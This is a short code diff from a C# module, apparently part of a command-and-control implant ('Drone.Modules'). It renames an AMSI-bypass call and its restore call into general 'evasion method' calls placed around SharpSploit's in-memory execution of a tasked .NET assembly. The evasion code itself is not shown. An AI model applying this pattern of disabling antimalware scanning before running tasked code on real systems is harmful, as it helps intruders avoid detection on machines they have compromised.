@@ -36,11 +36,11 @@ namespace Drone.Modules
             Console.SetOut(stdOutWriter);
             Console.SetError(stdErrWriter);
             
-            Evasion.BypassAmsi();
+            Evasion.DeployEvasionMethods();
                 
             SharpSploit.Execution.Assembly.Execute(asm, task.Arguments);
             
-            Evasion.RestoreAmsi();
+            Evasion.RestoreEvasionMethods();
                 
             Console.Out.Flush();
             Console.Error.Flush();
